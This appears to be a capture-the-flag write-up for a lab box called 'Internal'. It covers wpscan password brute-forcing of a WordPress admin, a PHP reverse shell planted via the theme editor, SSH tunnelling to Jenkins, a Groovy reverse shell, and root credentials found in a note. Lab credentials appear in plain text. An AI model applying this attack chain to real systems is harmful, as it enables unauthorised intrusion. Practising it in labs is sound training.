# Internal

# Penetration Test Scope
~~~
The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Ensure that you modify your hosts file to reflect internal.thm
Any tools or techniques are permitted in this engagement
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
~~~

# Recon
~~~
nano /etc/hosts
add interal.thm to IP

------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.107.78
------------------------------------------------------------
Scanning target 10.10.107.78
Time started: 2022-10-06 21:14:26.314332
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:01:10.529604
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.107.78 10.10.107.78
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.107.78 10.10.107.78
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 21:18 BST
Nmap scan report for internal.thm (10.10.107.78)
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
zsh: segmentation fault  nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.107.78 10.10.107.78
     

gobuster dir -u http://10.10.107.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.107.78
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 21:11:31 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.107.78/wordpress/]
/blog                 (Status: 301) [Size: 311] [--> http://10.10.107.78/blog/]     
/javascript           (Status: 301) [Size: 317] [--> http://10.10.107.78/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.107.78/phpmyadmin/]
~~~

# Enumeration
~~~
wpscan --url http://10.10.107.78/blog -e vp,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.107.78/blog/ [10.10.107.78]
[+] Started: Thu Oct  6 21:23:53 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.107.78/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.107.78/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.107.78/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.107.78/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.107.78/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct  6 21:24:00 2022
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 11.895 KB
[+] Data Received: 302.953 KB
[+] Memory used: 202.266 MB
[+] Elapsed time: 00:00:06

Now we have a user we can fuzz the password on Wordpress using wpscan

wpscan --url http://10.10.107.78/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.107.78/blog/ [10.10.107.78]
[+] Started: Thu Oct  6 21:27:07 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.107.78/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.107.78/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.107.78/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.107.78/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.107.78/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=====================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct  6 21:30:13 2022
[+] Requests Done: 4043
[+] Cached Requests: 28
[+] Data Sent: 1.938 MB
[+] Data Received: 2.202 MB
[+] Memory used: 255.016 MB
[+] Elapsed time: 00:03:05

Log into Wordpress with Username and Password found

start a nc Lister on attacker

using Theme editor use php-reverse-shell.php paste in and run the webserver page

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

Shell!

From manual enumeration i found

aubreanna:bubb13guM!@#123
~~~

# Exploit
~~~
sudo ssh aubreanna@10.10.107.78
The authenticity of host '10.10.107.78 (10.10.107.78)' can't be established.
ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.107.78' (ED25519) to the list of known hosts.
aubreanna@10.10.107.78's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct  6 20:48:45 UTC 2022

  System load:  0.0               Processes:              111
  Usage of /:   64.0% of 8.79GB   Users logged in:        0
  Memory usage: 38%               IP address for eth0:    10.10.107.78
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:46691         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.107.78:22         10.18.91.23:50118       ESTABLISHED on (0.07/0/0)
tcp        0      0 10.10.107.78:41006      10.18.91.23:53          ESTABLISHED off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 10.10.107.78:80         10.18.91.23:58074       ESTABLISHED keepalive (5217.62/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.107.78:68         0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:57903           0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)

Lets make a SSH tunnel to Internal Server

sudo ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.107.78

go to local host 127.0.0.1:8080

Will find jenkins server

I used ZAP proxy to fuzz 

I got spongebob as the password

Once logging in we know we can get a reverse shell from scripting console with Groovy scripting

now we need to enumerate in the shell.

cd /opt

ls 
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

sudo ssh root@10.10.107.78     
root@10.10.107.78's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct  6 21:34:03 UTC 2022

  System load:  0.03              Processes:              117
  Usage of /:   64.0% of 8.79GB   Users logged in:        1
  Memory usage: 44%               IP address for eth0:    10.10.107.78
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# ls -la
total 48
drwx------  7 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
-rw-------  1 root root  193 Aug  3  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug  3  2020 .cache
drwx------  3 root root 4096 Aug  3  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug  3  2020 .local
-rw-------  1 root root 1071 Aug  3  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug  3  2020 .ssh
-rw-r--r--  1 root root   22 Aug  3  2020 root.txt
drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
root@internal:~# cat root.txt

root@internal:/# cd home
root@internal:/home# ls
aubreanna
root@internal:/home# cd aubreanna/
root@internal:/home/aubreanna# l
jenkins.txt*  snap/  user.txt*
root@internal:/home/aubreanna# cat user.txt

Thank you!!
~~~

# 
